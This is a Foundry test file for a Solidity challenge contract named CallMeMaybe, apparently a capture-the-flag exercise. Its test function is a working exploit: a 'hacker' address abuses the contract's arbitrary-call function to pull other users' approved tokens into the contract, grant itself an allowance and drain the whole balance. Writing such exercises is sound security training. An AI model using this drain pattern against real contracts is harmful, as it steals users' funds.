// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;


import { Test, console } from "forge-std/Test.sol";
import { CallMeMaybe } from "../src/2_CallMeMaybe.sol";
import "../mocks/marqToken.sol";

contract CallMeMaybeTest is Test {
    CallMeMaybe public target;
    MarqToken public token;
    address[] public users = [address(0x01), address(0x02), address(0x03)];


    function setUp() public {
   token = new MarqToken();
        target = new CallMeMaybe(address(token));

        token.mint(601 ether);
        
        token.transfer(address(0xBAD), 1 ether);

        for (uint256 i; i < users.length; ++i) {
            address user = users[i];
            token.transfer(user, 200 ether);
            vm.startPrank(user);
            token.approve(address(target), type(uint256).max);
            target.joinGroup(100 ether);
            vm.stopPrank();
        }

        vm.prank(users[2]);
        target.leaveGroup();
    }


    function test_GetThisPassing_2() public {
        address hacker = address(0xBAD);
    uint256  amount = 1e18;
        vm.deal(hacker, amount);
        vm.startPrank(hacker);
        token.approve(address(target), amount);
target.joinGroup(amount);

   // iterate through and transfer the other users' tokens to the contract
    for (uint256 i; i < users.length; i++) {
        address user = users[i];
        bytes memory _calldata = abi.encodeCall(token.transferFrom, (user, address(target), token.balanceOf(user)));
        target.usePooledWealth(_calldata, address(token));
    }
  bytes memory _calldata = abi.encodeCall(token.approve, (hacker, type(uint256).max));
    
    // call the contract approving ourselves to spend the tokens
    target.usePooledWealth(_calldata, address(token));

    // transfer out the tokens
    token.transferFrom(address(target), hacker, 601 ether);


    
        vm.stopPrank();
        
    assertGt(token.balanceOf(hacker), 301 ether);
    }

}


